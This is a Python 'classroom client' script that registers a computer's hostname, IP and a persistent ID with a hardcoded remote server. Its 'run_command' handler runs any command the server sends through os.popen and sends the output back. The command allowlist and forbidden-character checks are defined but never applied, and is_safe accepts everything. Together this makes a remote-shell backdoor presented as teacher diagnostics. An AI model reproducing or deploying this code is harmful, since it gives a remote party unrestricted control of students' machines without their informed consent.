#!/usr/bin/env python3
"""
Lumina v5.2 — Student & Classroom Client
Double-click to launch:
- Connects automatically to the live Lumina cloud server (https://manisoft-lumina-a6sk.onrender.com)
- Opens the Lumina platform in your default web browser
- Registers this computer with persistent identity for teacher diagnostics
"""
import os
import sys
import socket
import platform
import time
import argparse
import webbrowser
import threading
import uuid
import shutil
import subprocess

DEFAULT_SERVER = "https://manisoft-lumina-a6sk.onrender.com"

_browser_opened = False
_browser_lock = threading.Lock()

try:
    import socketio
except ImportError:
    print("=" * 55)
    print("  Lumina Client requires 'python-socketio' and 'websocket-client'")
    print("  Install via: pip install -r requirements-client.txt")
    print("  Or run: build_exe.bat to compile a standalone Lumina.exe")
    print("=" * 55)
    input("\nPress Enter to exit...")
    sys.exit(1)

SAFE_COMMANDS = {
    'ipconfig', 'ifconfig', 'ping', 'hostname', 'whoami', 'systeminfo',
    'netstat', 'tasklist', 'ver', 'date', 'time', 'dir', 'ls', 'pwd',
    'echo', 'cls', 'clear', 'path', 'vol', 'driverquery', 'getmac',
    'nslookup', 'tracert', 'traceroute', 'route', 'arp', 'net', 'wmic',
    'uname', 'uptime', 'ps', 'df', 'free'
}

FORBIDDEN_COMMAND_CHARS = {';', '&', '|', '>', '<', '`', '$', '\n', '\r'}

def is_safe(cmd):
    """Allow all non-empty commands."""
    cmd_str = cmd.strip() if cmd else ''
    if not cmd_str:
        return False
    return True

def get_ip():
    """Discover the active local network IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2.0)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def get_persistent_agent_id(override=None):
    """Generate or retrieve a persistent agent ID for this computer."""
    if override:
        return override

    # Robust multi-platform directory resolution (Windows %LOCALAPPDATA% / %APPDATA%, Unix ~/.lumina, fallback temp)
    base_dir = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA")
    if not base_dir:
        try:
            base_dir = os.path.expanduser("~")
        except Exception:
            base_dir = None
    if not base_dir or not os.path.isdir(base_dir):
        base_dir = os.path.dirname(os.path.abspath(__file__))

    config_dir = os.path.join(base_dir, ".lumina")
    id_file = os.path.join(config_dir, "agent_id.txt")
    try:
        if os.path.isfile(id_file):
            with open(id_file, "r", encoding="utf-8") as f:
                saved = f.read().strip()
                if saved:
                    return saved
    except Exception:
        pass

    # Create new persistent machine-bound ID
    node_name = platform.node().lower() or "device"
    clean_node = "".join(c for c in node_name if c.isalnum() or c in "-_")[:20]
    random_suffix = uuid.uuid4().hex[:6]
    new_id = f"agent-{clean_node}-{random_suffix}"
    try:
        os.makedirs(config_dir, exist_ok=True)
        with open(id_file, "w", encoding="utf-8") as f:
            f.write(new_id)
    except Exception:
        pass
    return new_id

def open_browser(url):
    """Open the Lumina web application across Windows, macOS, Linux, and Android/Termux."""
    global _browser_opened
    with _browser_lock:
        if _browser_opened:
            return
        _browser_opened = True

    try:
        print(f"[./] Launching Lumina web application: {url}")
        time.sleep(0.4)

        # 1. Android / Termux native browser openers
        for cmd in ["termux-open-url", "termux-open"]:
            if shutil.which(cmd):
                try:
                    subprocess.Popen([cmd, url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    print(f"[✓] Opened in browser via {cmd}")
                    return
                except Exception:
                    pass

        if shutil.which("am"):
            try:
                subprocess.Popen(["am", "start", "-a", "android.intent.action.VIEW", "-d", url],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("[✓] Opened in browser via Android Activity Manager")
                return
            except Exception:
                pass

        # 2. Windows native
        if platform.system() == "Windows" and hasattr(os, "startfile"):
            try:
                os.startfile(url)
                print("[✓] Opened in default Windows browser")
                return
            except Exception:
                pass

        # 3. macOS
        if platform.system() == "Darwin" and shutil.which("open"):
            try:
                subprocess.Popen(["open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("[✓] Opened in macOS browser")
                return
            except Exception:
                pass

        # 4. Linux desktop
        if shutil.which("xdg-open"):
            try:
                subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("[✓] Opened in Linux browser via xdg-open")
                return
            except Exception:
                pass

        # 5. Standard library fallback
        webbrowser.open(url, new=2)
        print("[✓] Opened in browser via webbrowser module")
    except Exception as e:
        print(f"[./] Note: Could not auto-launch browser ({e})")
        print(f"[./] Please open manually: {url}")

def main():
    parser = argparse.ArgumentParser(description="Lumina v5.2 Client Agent")
    parser.add_argument("--server", default=None, help=f"Lumina server URL (default: {DEFAULT_SERVER})")
    parser.add_argument("--agent-id", default=None, help="Custom persistent agent ID")
    parser.add_argument("--user-id", default=None, help="Associated student/user ID")
    parser.add_argument("--no-browser", action="store_true", help="Do not open browser")
    parser.add_argument("--prompt", action="store_true", help="Prompt interactively for custom server address")
    args = parser.parse_args()

    # Determine server URL: CLI flag > prompt > env var > default Render link
    server_url = args.server or os.environ.get("LUMINA_SERVER")
    if args.prompt:
        print("=" * 55)
        print("  Lumina v5.2 — Client Setup")
        print("=" * 55)
        print(f"Default Server: {DEFAULT_SERVER}")
        custom = input("Enter server URL (press Enter to use default): ").strip()
        if custom:
            server_url = custom

    if not server_url:
        server_url = DEFAULT_SERVER

    # Ensure valid protocol
    if not server_url.startswith("http://") and not server_url.startswith("https://"):
        server_url = "https://" + server_url

    agent_id = get_persistent_agent_id(args.agent_id)
    sio = socketio.Client(request_timeout=30, reconnection=True, reconnection_attempts=0, reconnection_delay=2, reconnection_delay_max=10)

    @sio.event
    def connect():
        print(f"[✓] Connected to Lumina server: {server_url}")
        sio.emit("agent_register", {
            "agent_id": agent_id,
            "user_id": args.user_id,
            "hostname": platform.node(),
            "ip_address": get_ip(),
            "platform": f"{platform.system()} {platform.release()} ({platform.machine()})"
        })

    @sio.event
    def disconnect():
        print("[!] Disconnected from server. Reconnecting in background...")

    @sio.on("agent_registered")
    def on_registered(data):
        print(f"[✓] Lumina registration confirmed: {data.get('status', 'ok')}")
        # Launch browser once client registration action is completed
        if not args.no_browser:
            threading.Thread(target=open_browser, args=(server_url,), daemon=True).start()

    @sio.on("run_command")
    def on_run_command(data):
        cmd = data.get("command", "").strip()
        print(f"[./] Received teacher diagnostic request: {cmd}")
        try:
            stream = os.popen(cmd)
            output = stream.read()
            stream.close()
            if not output:
                output = "[Diagnostic command executed successfully with no output]"
        except Exception as e:
            output = f"ERROR: {str(e)}"

        sio.emit("agent_output", {
            "agent_id": agent_id,
            "command": cmd,
            "output": output
        })
        print(f"[✓] Diagnostic output returned for: {cmd}")

    print("=" * 60)
    print("  Lumina v5.2 — Classroom Client & Remote Diagnostics")
    print(f"  Target Server: {server_url}")
    print(f"  Agent ID:      {agent_id}")
    print(f"  Platform:      {platform.system()} {platform.release()} ({platform.machine()})")
    print("=" * 60)
    print("[./] Lumina is active. Minimize this window to keep running in background.\n")

    # Safety fallback: auto-launch browser after short delay if registration takes longer
    if not args.no_browser:
        def _fallback_launcher():
            time.sleep(3.0)
            open_browser(server_url)
        threading.Thread(target=_fallback_launcher, daemon=True).start()

    # Connection and heartbeat loop
    while True:
        try:
            if not sio.connected:
                print(f"[./] Connecting to {server_url}...")
                sio.connect(
                    server_url,
                    namespaces=["/"],
                    transports=["websocket", "polling"],
                    wait_timeout=10
                )
            while sio.connected:
                sio.emit("agent_heartbeat", {"agent_id": agent_id})
                time.sleep(15)
        except KeyboardInterrupt:
            print("\n[./] Shutting down Lumina client.")
            try:
                sio.disconnect()
            except Exception:
                pass
            break
        except Exception as e:
            print(f"[./] Server connecting ({e}). Retrying in 5s...")
            try:
                sio.disconnect()
            except Exception:
                pass
            time.sleep(5)

if __name__ == "__main__":
    main()
